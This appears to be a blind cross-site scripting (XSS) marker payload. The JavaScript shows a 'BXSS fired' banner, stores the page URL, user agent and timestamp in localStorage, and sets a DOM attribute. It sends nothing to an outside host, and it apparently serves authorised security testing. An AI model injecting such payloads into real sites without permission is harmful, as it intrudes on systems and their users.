(function () {
  try {
    const b = document.createElement('div');
    b.style = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#111;color:#0f0;padding:6px 8px;font:12px monospace';
    b.textContent = 'BXSS fired: ' + location.href;
    document.documentElement.appendChild(b);
  } catch (e) {}
  try {
    localStorage.setItem('bxss_info', JSON.stringify({ u: location.href, ua: navigator.userAgent, ts: new Date().toISOString() }));
  } catch (e) {}
  try {
    const jitter = 200 + Math.floor(Math.random() * 800);
    setTimeout(() => { try { document.documentElement.setAttribute('bxss-fired','1'); } catch (e) {} }, jitter);
  } catch (e) {}
})();
